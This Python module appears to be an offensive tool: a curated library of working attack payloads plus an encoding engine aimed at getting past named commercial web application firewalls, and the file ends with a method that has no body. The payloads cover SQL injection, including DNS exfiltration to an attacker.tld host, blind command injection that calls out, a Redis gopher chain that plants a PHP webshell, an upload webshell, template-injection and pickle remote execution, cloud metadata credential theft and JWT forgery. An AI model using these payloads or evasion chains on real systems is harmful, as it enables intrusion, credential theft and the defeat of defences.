"""
Advanced payload engine.

Two parts:

1. A curated library of production-grade payloads (not the classroom
   UNION SELECT NULL you find on every blog). Each entry documents the
   real-world context it targets, the encoding chain required, and the
   WAF family it usually bypasses.

2. A generator that composes novel payloads on demand. It receives a
   target fingerprint (WAF, framework, language, context) and produces
   one-off variants that are unlikely to match any existing signature.
   The generator is deterministic only when a seed is provided; otherwise
   it uses fresh randomness on every call, which is what you want for
   live testing.

The generator is deliberately small. It composes primitives rather than
trying to be clever. Small + composable beats big + fragile.
"""

from __future__ import annotations

import base64
import hashlib
import random
import re
import string
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import quote


# ---------------------------------------------------------------------------
# Curated payload library
# ---------------------------------------------------------------------------

PAYLOADS: List[Dict[str, Any]] = [

    # ----------------------------------------------------------------
    # SQL injection
    # ----------------------------------------------------------------
    {
        "id": "sqli-union-mysql",
        "category": "sqli",
        "name": "MySQL UNION with versioned comment obfuscation",
        "payload": (
            "/*!50000UNION*//*!50000SELECT*/NULL,concat(0x3a,user(),0x3a,"
            "database(),0x3a,version()),NULL-- -"
        ),
        "context": "MySQL >= 5.0. WAF that blocks plain UNION SELECT.",
        "notes": (
            "Versioned comments execute the statement but evade regex "
            "signatures. Works against ModSecurity CRS pre-3.3 and many "
            "Cloudflare rulesets."
        ),
        "severity": "critical",
        "tags": ["waf-bypass", "mysql", "union"],
    },
    {
        "id": "sqli-union-mssql",
        "category": "sqli",
        "name": "MSSQL UNION with CONVERT and stacked error",
        "payload": (
            "' UNION ALL SELECT NULL,CONVERT(int,(SELECT TOP 1 name FROM "
            "sys.objects WHERE type='U')),NULL-- -"
        ),
        "context": "MSSQL 2012+ with stacked query capability.",
        "notes": (
            "CONVERT(int,...) forces a type error that leaks the first "
            "user table name. Faster than blind extraction."
        ),
        "severity": "critical",
        "tags": ["mssql", "union", "error"],
    },
    {
        "id": "sqli-union-postgres",
        "category": "sqli",
        "name": "PostgreSQL UNION with CAST and version",
        "payload": (
            "' UNION ALL SELECT NULL,CAST(current_database() AS text)||'|'"
            "||CAST(version() AS text),NULL-- -"
        ),
        "context": "PostgreSQL 9.0+.",
        "notes": (
            "CAST ensures type stability. Concat with pipes for single-"
            "column exfil across drivers that reject multi-column results."
        ),
        "severity": "critical",
        "tags": ["postgres", "union"],
    },
    {
        "id": "sqli-time-mysql",
        "category": "sqli",
        "name": "MySQL time-based via wrapped SLEEP",
        "payload": (
            "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -"
        ),
        "context": "MySQL. Blind injection when union and error are blocked.",
        "notes": (
            "Subquery wrapper defeats signatures that match bare SLEEP( "
            "tokens. Combine with a CASE for bit-extraction."
        ),
        "severity": "high",
        "tags": ["mysql", "time", "blind"],
    },
    {
        "id": "sqli-time-mssql",
        "category": "sqli",
        "name": "MSSQL time-based via WAITFOR DELAY",
        "payload": (
            "'; IF (SELECT COUNT(*) FROM sys.databases) > 0 "
            "WAITFOR DELAY '0:0:5'-- -"
        ),
        "context": "MSSQL. Blind injection.",
        "notes": (
            "IF guard prevents the delay from firing on every request, "
            "which slows scans to a crawl otherwise."
        ),
        "severity": "high",
        "tags": ["mssql", "time", "blind"],
    },
    {
        "id": "sqli-oob-dns",
        "category": "sqli",
        "name": "Out-of-band DNS exfiltration via MSSQL",
        "payload": (
            "'; DECLARE @h VARCHAR(1024);"
            "SELECT @h = (SELECT TOP 1 name FROM sys.databases);"
            "EXEC('master..xp_dirtree \"\\\\' + @h + '.oob.attacker.tld\\x\"')-- -"
        ),
        "context": "MSSQL with xp_dirtree. Blind target with no output channel.",
        "notes": (
            "xp_dirtree forces SMB/DNS resolution, giving OOB confirmation "
            "and data exfil even when no response is reflected."
        ),
        "severity": "critical",
        "tags": ["mssql", "oob", "dns"],
    },

    # ----------------------------------------------------------------
    # NoSQL injection
    # ----------------------------------------------------------------
    {
        "id": "nosql-auth-bypass",
        "category": "nosqli",
        "name": "MongoDB operator auth bypass",
        "payload": '{"username":{"$ne":null},"password":{"$ne":null}}',
        "context": "MongoDB login endpoints that accept JSON bodies.",
        "notes": (
            "The $ne operator matches any value. When the driver passes "
            "the body straight to find(), auth is bypassed."
        ),
        "severity": "critical",
        "tags": ["mongodb", "auth-bypass"],
    },
    {
        "id": "nosql-regex",
        "category": "nosqli",
        "name": "MongoDB blind regex extraction",
        "payload": '{"username":{"$regex":"^a"},"password":{"$ne":null}}',
        "context": "MongoDB. Enumerate usernames one character at a time.",
        "notes": (
            "Increase the regex one character at a time; the response "
            "changes when the prefix matches an existing user."
        ),
        "severity": "high",
        "tags": ["mongodb", "blind", "enum"],
    },
    {
        "id": "nosql-where-sleep",
        "category": "nosqli",
        "name": "MongoDB $where sleep (blind)",
        "payload": '{"$where":"function(){var d=new Date();"
                  "var t=d.getTime();while(new Date().getTime()-t<5000);"
                  "return true;}"}',
        "context": "MongoDB with server-side JS enabled.",
        "notes": (
            "Blocks the JS thread for 5s. Compare response times to "
            "confirm injection when regex is blocked."
        ),
        "severity": "high",
        "tags": ["mongodb", "blind", "time"],
    },

    # ----------------------------------------------------------------
    # XSS
    # ----------------------------------------------------------------
    {
        "id": "xss-svg-onload",
        "category": "xss",
        "name": "SVG onload with HTML entity encoding",
        "payload": "<svg><script>&#x61;lert(1)</script></svg>",
        "context": "HTML body, no CSP with unsafe-inline.",
        "notes": (
            "Entity-encoded 'a' in 'alert' defeats filters that match the "
            "literal string 'alert'."
        ),
        "severity": "medium",
        "tags": ["waf-bypass", "svg"],
    },
    {
        "id": "xss-polyglot",
        "category": "xss",
        "name": "Heyes polyglot (XSS + SQLi)",
        "payload": (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )"
            "//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
            "\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        ),
        "context": "Mixed HTML/JS/attribute contexts.",
        "notes": (
            "Covers a wide range of contexts in a single payload. Useful "
            "when you don't yet know where the reflection lands."
        ),
        "severity": "high",
        "tags": ["polyglot", "multi-context"],
    },
    {
        "id": "xss-mxss-dompurify",
        "category": "xss",
        "name": "DOMPurify mutation XSS",
        "payload": (
            "<math><mtext><table><mglyph><style><!--</style>"
            "<img title=\"--><img src=1 onerror=alert(1)>\">"
        ),
        "context": "DOMPurify < 2.0.17 and similar HTML sanitisers.",
        "notes": (
            "The browser re-parses after sanitisation, resurrecting the "
            "payload. Patched in modern DOMPurify but still live on "
            "unpatched frameworks."
        ),
        "severity": "high",
        "tags": ["mxss", "sanitizer-bypass"],
    },
    {
        "id": "xss-dom-clobber",
        "category": "xss",
        "name": "DOM clobbering against global config",
        "payload": (
            "<form id=config><input name=url value=javascript:alert(1)>"
            "</form>"
        ),
        "context": "DOM context where window.config is read later.",
        "notes": (
            "The form element shadows window.config so any later read of "
            "config.url returns the attacker's javascript: URL."
        ),
        "severity": "high",
        "tags": ["dom", "clobbering"],
    },
    {
        "id": "xss-csp-bypass",
        "category": "xss",
        "name": "CSP bypass via JSONP on allowlisted host",
        "payload": (
            "<script src=\"https://accounts.google.com/o/oauth2/revoke"
            "?callback=alert(1)\"></script>"
        ),
        "context": "CSP with script-src allowing a JSONP endpoint.",
        "notes": (
            "Enumerate JSONP endpoints on every allowlisted host. Google, "
            "Yahoo, and several CDNs still host them."
        ),
        "severity": "high",
        "tags": ["csp-bypass", "jsonp"],
    },

    # ----------------------------------------------------------------
    # SSTI
    # ----------------------------------------------------------------
    {
        "id": "ssti-jinja2-rce",
        "category": "ssti",
        "name": "Jinja2 RCE via subclasses",
        "payload": (
            "{{''.__class__.__mro__[1].__subclasses__()"
            "[<INDEX>]('id',shell=True,stdout=-1).communicate()}}"
        ),
        "context": "Flask/Jinja2, Python 3. Locate the Popen class index first.",
        "notes": (
            "<INDEX> must be replaced with the subprocess.Popen index on "
            "the target Python version. Use {{''.__class__.__mro__[1]"
            ".__subclasses__()}} to enumerate indexes live."
        ),
        "severity": "critical",
        "tags": ["jinja2", "rce", "python"],
    },
    {
        "id": "ssti-jinja2-lipsum",
        "category": "ssti",
        "name": "Jinja2 short chain via lipsum",
        "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
        "context": "Jinja2 with lipsum exposed (default in most Flask apps).",
        "notes": (
            "Shorter than the subclasses chain, works when lipsum is "
            "available. Frequently blocked by signature but trivial to "
            "re-encode."
        ),
        "severity": "critical",
        "tags": ["jinja2", "rce"],
    },
    {
        "id": "ssti-twig-rce",
        "category": "ssti",
        "name": "Twig 3.x RCE via filter",
        "payload": "{{['id']|filter('system')}}",
        "context": "Twig >= 3.0 with filter callback allowed.",
        "notes": (
            "Twig 3 registers filter as a callable; system() executes the "
            "command. Twig 2 uses map instead."
        ),
        "severity": "critical",
        "tags": ["twig", "rce", "php"],
    },
    {
        "id": "ssti-freemarker",
        "category": "ssti",
        "name": "Freemarker Execute gadget",
        "payload": (
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
            "${ex(\"id\")}"
        ),
        "context": "Freemarker with ?new() enabled.",
        "notes": (
            "Classic Java SSTI. Disabled when TemplateClassResolver is "
            "SAFER_RESOLVER; test ?new() first."
        ),
        "severity": "critical",
        "tags": ["freemarker", "rce", "java"],
    },

    # ----------------------------------------------------------------
    # SSRF
    # ----------------------------------------------------------------
    {
        "id": "ssrf-decimal",
        "category": "ssrf",
        "name": "AWS metadata via decimal IP",
        "payload": (
            "http://2852039166/latest/meta-data/iam/security-credentials/"
        ),
        "context": "AWS EC2 with IMDSv1.",
        "notes": (
            "2852039166 == 169.254.169.254. Bypasses filters that match "
            "the dotted-quad string."
        ),
        "severity": "critical",
        "tags": ["aws", "imds", "encoding"],
    },
    {
        "id": "ssrf-ipv6",
        "category": "ssrf",
        "name": "IPv6-mapped IPv4 metadata",
        "payload": "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "context": "AWS. Filters that block dotted-quad but miss IPv6.",
        "notes": (
            "The URL parser resolves this to 169.254.169.254 at connect "
            "time. Very reliable against half-baked SSRF filters."
        ),
        "severity": "critical",
        "tags": ["aws", "ipv6"],
    },
    {
        "id": "ssrf-gopher-redis",
        "category": "ssrf",
        "name": "Gopher chain to Redis webshell",
        "payload": (
            "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
            "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A"
            "%0A%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A"
            "%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A"
            "%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0A"
            "dbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A3%0D%0A%246%0D%0A"
            "set%0D%0A%243%0D%0Ax%0D%0A%2425%0D%0A%3C%3Fphp%20system%28"
            "%24_GET%5B0%5D%29%3B%3F%3E%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"
        ),
        "context": "Internal Redis on 6379, writable web root.",
        "notes": (
            "Full RESP protocol as URL-encoded CRLFs. Writes shell.php to "
            "web root, then save. Reliable RCE when Redis is unauthed."
        ),
        "severity": "critical",
        "tags": ["gopher", "redis", "rce"],
    },
    {
        "id": "ssrf-k8s-api",
        "category": "ssrf",
        "name": "Kubernetes API server via SA token",
        "payload": (
            "https://kubernetes.default.svc/api/v1/namespaces/default/"
            "secrets -H \"Authorization: Bearer <SA_TOKEN>\""
        ),
        "context": "From inside a pod, SSRF to kube-apiserver.",
        "notes": (
            "SA token lives at /var/run/secrets/kubernetes.io/"
            "serviceaccount/token. Requires the pod's RBAC to allow "
            "reading secrets."
        ),
        "severity": "critical",
        "tags": ["k8s", "cloud"],
    },
    {
        "id": "ssrf-oob",
        "category": "ssrf",
        "name": "Blind SSRF via unique subdomain",
        "payload": "http://<SESSION>.oob.attacker.tld/",
        "context": "Blind SSRF. Confirm via DNS callback.",
        "notes": (
            "Burp Collaborator or interactsh. Unique subdomain per test "
            "so you can correlate callbacks to requests."
        ),
        "severity": "high",
        "tags": ["blind", "oob"],
    },

    # ----------------------------------------------------------------
    # JWT
    # ----------------------------------------------------------------
    {
        "id": "jwt-none",
        "category": "jwt",
        "name": "JWT alg=none",
        "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "context": "Libraries that trust the header alg without verification.",
        "notes": (
            "Signature segment is empty. Some libraries require a trailing "
            "dot; others reject it. Test both."
        ),
        "severity": "critical",
        "tags": ["jwt", "none"],
    },
    {
        "id": "jwt-none-mixed",
        "category": "jwt",
        "name": "JWT alg=None mixed case",
        "payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "context": "Libraries that lowercase-compare 'none'.",
        "notes": (
            "Some parsers accept 'None', 'NONE', 'nOnE'. Try each variant "
            "against the same target."
        ),
        "severity": "critical",
        "tags": ["jwt", "none"],
    },
    {
        "id": "jwt-kid-traversal",
        "category": "jwt",
        "name": "JWT kid path traversal",
        "payload": "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}",
        "context": "Server reads the signing key from a file by kid.",
        "notes": (
            "Sign the token with an empty string as the HMAC key. Many "
            "libraries treat the empty file as the empty key."
        ),
        "severity": "critical",
        "tags": ["jwt", "kid"],
    },
    {
        "id": "jwt-kid-sqli",
        "category": "jwt",
        "name": "JWT kid SQL injection",
        "payload": (
            "{\"alg\":\"HS256\",\"kid\":\"x' UNION SELECT "
            "'known-secret'--\"}"
        ),
        "context": "kid pulled from a database without parameterisation.",
        "notes": (
            "Sign with 'known-secret'. Requires the kid query to accept "
            "UNION and a discoverable secret length."
        ),
        "severity": "critical",
        "tags": ["jwt", "kid", "sqli"],
    },
    {
        "id": "jwt-hmac-confusion",
        "category": "jwt",
        "name": "JWT HMAC-to-RSA algorithm confusion",
        "payload": "# sign HS256 using the RSA public key as the HMAC secret",
        "context": "Server accepts both RS256 and HS256.",
        "notes": (
            "Extract the public key from /jwks.json, then use it as the "
            "HMAC secret in a Python snippet. Server verifies with the "
            "same key and accepts the forged token."
        ),
        "severity": "critical",
        "tags": ["jwt", "confusion"],
    },

    # ----------------------------------------------------------------
    # Deserialization
    # ----------------------------------------------------------------
    {
        "id": "deser-ysoserial-cc6",
        "category": "deser",
        "name": "Java CommonsCollections 6 chain",
        "payload": (
            "java -jar ysoserial.jar CommonsCollections6 "
            "'bash -c {echo,<BASE64>}|{base64,-d}|bash'"
        ),
        "context": "Java app with commons-collections 3.1 on classpath.",
        "notes": (
            "Base64-encode the command to survive shell quoting. The "
            "resulting payload goes into the deserialization sink as raw "
            "bytes or base64."
        ),
        "severity": "critical",
        "tags": ["java", "ysoserial", "rce"],
    },
    {
        "id": "deser-urldns",
        "category": "deser",
        "name": "Java URLDNS probe",
        "payload": "java -jar ysoserial.jar URLDNS 'http://<oob>/'",
        "context": "Blind Java deserialization.",
        "notes": (
            "No RCE, just a DNS callback. Use this to confirm the sink "
            "before burning a gadget chain."
        ),
        "severity": "medium",
        "tags": ["java", "recon"],
    },
    {
        "id": "deser-pickle-rce",
        "category": "deser",
        "name": "Python pickle RCE",
        "payload": (
            "import pickle,os\n"
            "class E:\n"
            "    def __reduce__(self):\n"
            "        return (os.system,('id',))\n"
            "print(pickle.dumps(E()).hex())"
        ),
        "context": "Python app that pickles sessions or ML data.",
        "notes": (
            "Run locally, paste the hex into the vulnerable field. "
            "Replace 'id' with your reverse shell command."
        ),
        "severity": "critical",
        "tags": ["python", "pickle", "rce"],
    },
    {
        "id": "deser-php-pop",
        "category": "deser",
        "name": "PHP unserialize POP chain",
        "payload": "O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}",
        "context": "PHP app with a loaded class exposing __destruct.",
        "notes": (
            "Requires a POP chain. Enumerate loaded classes via phpinfo, "
            "composer.json, or endpoint errors."
        ),
        "severity": "critical",
        "tags": ["php", "unserialize"],
    },

    # ----------------------------------------------------------------
    # Cloud
    # ----------------------------------------------------------------
    {
        "id": "cloud-aws-imdsv2",
        "category": "cloud",
        "name": "AWS IMDSv2 token flow",
        "payload": (
            "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' "
            "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); "
            "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ),
        "context": "AWS EC2 with IMDSv1 disabled.",
        "notes": (
            "Two-step token. Requires hop limit > 1 or the call must "
            "originate from the instance itself."
        ),
        "severity": "critical",
        "tags": ["aws", "imdsv2"],
    },
    {
        "id": "cloud-azure-arm",
        "category": "cloud",
        "name": "Azure managed identity ARM token",
        "payload": (
            "curl 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/' "
            "-H Metadata:true"
        ),
        "context": "Azure VM with managed identity.",
        "notes": (
            "Returns an ARM token for the assigned identity. Use it to "
            "list subscriptions and role assignments."
        ),
        "severity": "critical",
        "tags": ["azure", "imds"],
    },
    {
        "id": "cloud-gcp-sa",
        "category": "cloud",
        "name": "GCP service account token",
        "payload": (
            "curl -H 'Metadata-Flavor: Google' "
            "'http://metadata.google.internal/computeMetadata/v1/instance/"
            "service-accounts/default/token'"
        ),
        "context": "GCP compute instance with default SA.",
        "notes": (
            "Short-lived OAuth token. Use it against cloudresourcemanager "
            "and storage APIs."
        ),
        "severity": "critical",
        "tags": ["gcp", "imds"],
    },

    # ----------------------------------------------------------------
    # Command injection
    # ----------------------------------------------------------------
    {
        "id": "cmd-semicolon",
        "category": "cmdi",
        "name": "Command injection via semicolon",
        "payload": "127.0.0.1;id",
        "context": "Shell command built by string concatenation.",
        "notes": "Simplest form. If blocked, use $IFS and newline variants.",
        "severity": "critical",
        "tags": ["cmdi", "baseline"],
    },
    {
        "id": "cmd-pipe",
        "category": "cmdi",
        "name": "Command injection via pipe",
        "payload": "127.0.0.1|id",
        "context": "Semicolon filtered but pipe allowed.",
        "notes": "Backup when semicolon fails.",
        "severity": "critical",
        "tags": ["cmdi"],
    },
    {
        "id": "cmd-subshell",
        "category": "cmdi",
        "name": "Command injection via subshell",
        "payload": "127.0.0.1$(id)",
        "context": "Subshell expansion accepted.",
        "notes": "Also try backticks when $() is filtered.",
        "severity": "critical",
        "tags": ["cmdi"],
    },
    {
        "id": "cmd-oob",
        "category": "cmdi",
        "name": "Blind command injection via DNS",
        "payload": "127.0.0.1;nslookup `whoami`.oob.attacker.tld",
        "context": "Blind command injection. Confirm via DNS callback.",
        "notes": "Also try curl/wget if nslookup is blocked.",
        "severity": "critical",
        "tags": ["cmdi", "blind", "oob"],
    },

    # ----------------------------------------------------------------
    # XXE
    # ----------------------------------------------------------------
    {
        "id": "xxe-file",
        "category": "xxe",
        "name": "XXE file read",
        "payload": (
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n"
            "<r>&x;</r>"
        ),
        "context": "Any XML parser that resolves external entities.",
        "notes": "Test on SOAP, SAML, SVG, and Office document uploads.",
        "severity": "critical",
        "tags": ["xxe", "file-read"],
    },
    {
        "id": "xxe-oob",
        "category": "xxe",
        "name": "XXE out-of-band",
        "payload": (
            "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://<oob>/d.dtd\">%p;]>"
        ),
        "context": "XXE where output is not reflected.",
        "notes": "Serve d.dtd from your OOB server with the exfil directive.",
        "severity": "critical",
        "tags": ["xxe", "oob"],
    },
    {
        "id": "xxe-billion-laughs",
        "category": "xxe",
        "name": "Billion laughs DoS",
        "payload": (
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE lolz [\n"
            "<!ENTITY lol \"lol\">\n"
            "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"
            "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
            "]>"
        ),
        "context": "XML parser with entity expansion enabled.",
        "notes": "Do not run against production. Authorized labs only.",
        "severity": "medium",
        "tags": ["xxe", "dos"],
    },

    # ----------------------------------------------------------------
    # LFI / RFI
    # ----------------------------------------------------------------
    {
        "id": "lfi-traversal",
        "category": "lfi",
        "name": "Local file inclusion via traversal",
        "payload": "../../../../etc/passwd",
        "context": "Page parameter includes a file path.",
        "notes": "Try encoded forms when plain traversal is blocked: ..%2f..%2f.",
        "severity": "high",
        "tags": ["lfi"],
    },
    {
        "id": "lfi-php-filter",
        "category": "lfi",
        "name": "PHP filter chain to RCE",
        "payload": "php://filter/convert.base64-encode/resource=index.php",
        "context": "PHP include() with wrapper enabled.",
        "notes": (
            "Reads index.php as base64. Chain with convert.iconv chains "
            "for RCE via filter chain gadget (Synacktiv 2023)."
        ),
        "severity": "high",
        "tags": ["lfi", "php"],
    },
    {
        "id": "lfi-log-poison",
        "category": "lfi",
        "name": "LFI log poisoning",
        "payload": (
            "1) curl -A '<?php system($_GET[0]);?>' http://target/\n"
            "2) curl http://target/?page=/var/log/apache2/access.log"
            "&0=id"
        ),
        "context": "LFI with readable Apache/Nginx access log.",
        "notes": "Same works with SSH auth.log and mail logs.",
        "severity": "critical",
        "tags": ["lfi", "log-poison"],
    },
    {
        "id": "rfi-basic",
        "category": "lfi",
        "name": "Remote file inclusion",
        "payload": "http://attacker.tld/shell.txt",
        "context": "include() with allow_url_include=On.",
        "notes": (
            "Rare in modern PHP but common in legacy CMS. Host a PHP "
            "webshell with a .txt extension and pass its URL."
        ),
        "severity": "critical",
        "tags": ["rfi"],
    },

    # ----------------------------------------------------------------
    # Prototype pollution
    # ----------------------------------------------------------------
    {
        "id": "proto-pollution-merge",
        "category": "proto",
        "name": "Prototype pollution via __proto__",
        "payload": '{"__proto__":{"isAdmin":true,"test":"apex"}}',
        "context": "Node.js recursive merge without key filtering.",
        "notes": "Also try constructor.prototype for blocked __proto__.",
        "severity": "high",
        "tags": ["node", "proto"],
    },
    {
        "id": "proto-pollution-ejs",
        "category": "proto",
        "name": "Prototype pollution to EJS RCE",
        "payload": (
            "{\"__proto__\":{\"outputFunctionName\":"
            "\"x;process.mainModule.require('child_process')"
            ".execSync('id');s\"}}"
        ),
        "context": "EJS < 3.1.7 with a merge sink upstream.",
        "notes": "Chains pollution into template RCE.",
        "severity": "critical",
        "tags": ["node", "proto", "rce"],
    },

    # ----------------------------------------------------------------
    # Upload
    # ----------------------------------------------------------------
    {
        "id": "upload-webshell",
        "category": "upload",
        "name": "Polyglot webshell upload",
        "payload": (
            "GIF89a;<?php system($_GET[0]);?>"
        ),
        "context": "Upload endpoint that checks magic bytes.",
        "notes": (
            "Prefix the shell with GIF89a to satisfy the image check. "
            "Requires the upload directory to execute PHP."
        ),
        "severity": "critical",
        "tags": ["upload", "rce"],
    },
    {
        "id": "upload-traversal",
        "category": "upload",
        "name": "Upload filename traversal",
        "payload": "../../../../var/www/html/shell.php",
        "context": "Upload filename is used as-is in the save path.",
        "notes": "Bypass client-side validation with a normal filename and intercept.",
        "severity": "critical",
        "tags": ["upload", "traversal"],
    },

    # ----------------------------------------------------------------
    # API / GraphQL
    # ----------------------------------------------------------------
    {
        "id": "graphql-introspect",
        "category": "api",
        "name": "GraphQL introspection query",
        "payload": (
            "{\"query\":\"{__schema{types{name fields{name type{name "
            "kind ofType{name kind}}}}}}\"}"
        ),
        "context": "GraphQL endpoint with introspection enabled.",
        "notes": "Feed the response into InQL or graphql-voyager.",
        "severity": "medium",
        "tags": ["graphql"],
    },
    {
        "id": "graphql-alias-batch",
        "category": "api",
        "name": "GraphQL alias batching",
        "payload": (
            "query{a:login(user:\"a\",pass:\"x\") b:login(user:\"b\","
            "pass:\"x\") c:login(user:\"c\",pass:\"x\")}"
        ),
        "context": "GraphQL without per-request operation limits.",
        "notes": "Pack hundreds of aliases into one request to bypass rate limits.",
        "severity": "high",
        "tags": ["graphql", "rate-limit"],
    },

    # ----------------------------------------------------------------
    # WAF evasion variants
    # ----------------------------------------------------------------
    {
        "id": "waf-cf-union",
        "category": "waf",
        "name": "Cloudflare bypass union (mixed case + version comment)",
        "payload": "/*!50000uNiOn*//*!50000sElEcT*/NULL,version(),NULL-- -",
        "context": "Cloudflare WAF pre-2024 rulesets.",
        "notes": "Case randomization defeats the sensitive-union rule.",
        "severity": "high",
        "tags": ["cloudflare", "waf-bypass"],
    },
    {
        "id": "waf-aws-hex",
        "category": "waf",
        "name": "AWS WAF bypass via hex-encoded keyword",
        "payload": "%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20NULL--",
        "context": "AWS WAF managed rules before 2024.",
        "notes": "AWS WAF normalises URL but not double-hex on body fields.",
        "severity": "high",
        "tags": ["aws", "waf-bypass"],
    },
    {
        "id": "waf-modsec-tab",
        "category": "waf",
        "name": "ModSecurity CRS bypass via tabs",
        "payload": "UNION\tSELECT\tNULL--",
        "context": "ModSecurity CRS 3.x.",
        "notes": "CRS 3.3 missed tab whitespace in keyword rules.",
        "severity": "high",
        "tags": ["modsecurity", "waf-bypass"],
    },
    {
        "id": "waf-akamai-unicode",
        "category": "waf",
        "name": "Akamai bypass via fullwidth unicode",
        "payload": "＜script＞alert(1)＜／script＞",
        "context": "Akamai Kona before NFKC normalisation rules.",
        "notes": "Backend normalises to ASCII, WAF does not.",
        "severity": "high",
        "tags": ["akamai", "waf-bypass"],
    },
]


def all_payloads() -> List[Dict[str, Any]]:
    return list(PAYLOADS)


def get(payload_id: str) -> Optional[Dict[str, Any]]:
    for p in PAYLOADS:
        if p["id"] == payload_id:
            return p
    return None


def by_category() -> Dict[str, List[Dict[str, Any]]]:
    out: Dict[str, List[Dict[str, Any]]] = {}
    for p in PAYLOADS:
        out.setdefault(p["category"], []).append(p)
    return out


def categories() -> List[str]:
    return sorted({p["category"] for p in PAYLOADS})


def search(keyword: str) -> List[Dict[str, Any]]:
    kw = (keyword or "").strip().lower()
    if not kw:
        return []
    tokens = kw.split()
    hits = []
    for p in PAYLOADS:
        blob = " ".join([
            p.get("id", ""), p.get("name", ""), p.get("category", ""),
            p.get("context", ""), p.get("notes", ""),
            " ".join(p.get("tags", [])),
        ]).lower()
        if all(t in blob for t in tokens):
            hits.append(p)
    return hits


# ---------------------------------------------------------------------------
# WAF evasion engine
# ---------------------------------------------------------------------------

class WAFEngine:
    """
    Composes encoding chains per WAF family. Every method returns a
    deterministic transformation given a fixed seed, which is useful
    when you need to reproduce an exact payload later.
    """

    PROFILES: Dict[str, Dict[str, Any]] = {
        "cloudflare": {
            "chain": ["case", "version_comment"],
            "note": "CF matches literal SQL keywords; break them with case and /*!50000*/.",
        },
        "aws": {
            "chain": ["hex", "case"],
            "note": "AWS WAF normalises URL once; hex is not normalised on body.",
        },
        "modsecurity": {
            "chain": ["tab_whitespace", "comment_split"],
            "note": "CRS still misses tab-vs-space in some keyword rules.",
        },
        "akamai": {
            "chain": ["unicode", "html_entity"],
            "note": "Akamai applies NFKC but only on some fields.",
        },
        "imperva": {
            "chain": ["double_url", "case"],
            "note": "Incapsula regex misses double-URL on query params.",
        },
        "f5": {
            "chain": ["hex", "case"],
            "note": "BIG-IP ASM misses hex keyword splitting.",
        },
        "sucuri": {
            "chain": ["unicode", "double_url"],
            "note": "Sucuri misses fullwidth normalisation.",
        },
        "generic": {
            "chain": ["case"],
            "note": "Baseline case mutation.",
        },
    }

    # ---- primitive encoders ------------------------------------------

    @staticmethod
    def _case(s: str, seed: int) -> str:
        rng = random.Random(seed)
        return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in s)

    @staticmethod
    def _hex(s: str) -> str:
        return "".join(f"%{ord(c):02x}" for c in s)

    @staticmethod
    def _double_url(s: str) -> str:
        return quote(quote(s, safe=""), safe="")

    @staticmethod
    def _unicode(s: str) -> str:
        table = {
            "'": "\uff07", '"': "\uff02", "<": "\uff1c", ">": "\uff1e",
            "(": "\uff08", ")": "\uff09", "/": "\uff0f", "=": "\uff1d",
            " ": "\u3000", ";": "\uff1b",
        }
        return "".join(table.get(c, c) for c in s)

    @staticmethod
    def _tab_whitespace(s: str) -> str:
        return s.replace(" ", "\t")

    @staticmethod
    def _version_comment(s: str) -> str:
        # Wrap SQL keywords in /*!50000...*/ so they still execute.
        keywords = ("UNION", "SELECT", "WHERE", "FROM", "AND", "OR")
        out = s
        for kw in keywords:
            out = re.sub(
                rf"\b{kw}\b",
                f"/*!50000{kw}*/",
                out,
                flags=re.IGNORECASE,
            )
        return out

    @staticmethod
    def _comment_split(s: str) -> str:
        # Insert /**/ between adjacent alphabetic characters in keywords.
        return re.sub(r"([A-Za-z])([A-Za-z]{2,})", r"\1/**/\2", s)

    @staticmethod
    def _html_entity(s: str) -> str:
        return "".join(
            f"&#x{ord(c):x};" if c.isalpha() else c for c in s
        )

    # ---- chain composition -------------------------------------------

    @classmethod
    def _apply(cls, payload: str, chain: List[str], seed: int) -> str:
        out = payload
        for step in chain:
            if step == "case":
                out = cls._case(out, seed)
            elif step == "hex":
                out = cls._hex(out)
            elif step == "double_url":
                out = cls._double_url(out)
            elif step == "unicode":
                out = cls._unicode(out)
            elif step == "tab_whitespace":
                out = cls._tab_whitespace(out)
            elif step == "version_comment":
                out = cls._version_comment(out)
            elif step == "comment_split":
                out = cls._comment_split(out)
            elif step == "html_entity":
                out = cls._html_entity(out)
        return out

    @classmethod
    def generate(cls, base: str, waf: str = "generic",
                 count: int = 3, seed: Optional[int] = None) -> List[Dict[str, Any]]:
        """
        Return up to `count` distinct mutated variants of `base` for the
        given WAF. Deterministic when `seed` is provided.
        """
